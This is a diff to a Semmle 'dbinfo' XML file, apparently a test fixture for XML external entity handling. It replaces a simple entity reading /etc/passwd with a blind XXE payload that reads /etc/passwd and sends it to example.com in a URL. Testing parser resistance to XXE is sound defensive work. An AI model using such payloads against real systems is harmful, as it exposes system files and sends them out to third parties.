@@ -1,7 +1,10 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE example [<!ENTITY flag SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]>
 <ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
-    <sourceLocationPrefix>&flag;</sourceLocationPrefix>
+    <sourceLocationPrefix>&blind;</sourceLocationPrefix>
     <baselineLinesOfCode>420</baselineLinesOfCode>
     <unicodeNewlines>false</unicodeNewlines>
     <columnKind>utf16</columnKind>
